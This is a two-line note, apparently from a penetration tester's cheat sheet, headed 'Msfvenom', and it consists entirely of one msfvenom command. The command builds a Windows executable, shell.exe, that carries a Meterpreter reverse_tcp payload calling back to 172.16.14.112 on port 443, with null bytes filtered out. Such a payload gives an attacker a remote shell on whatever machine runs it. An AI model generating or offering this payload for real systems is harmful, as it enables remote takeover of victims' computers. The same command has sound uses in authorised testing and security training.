# Msfvenom
Create with:

msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=172.16.14.112 LPORT=443 -b "\x00" -f exe -o shell.exe

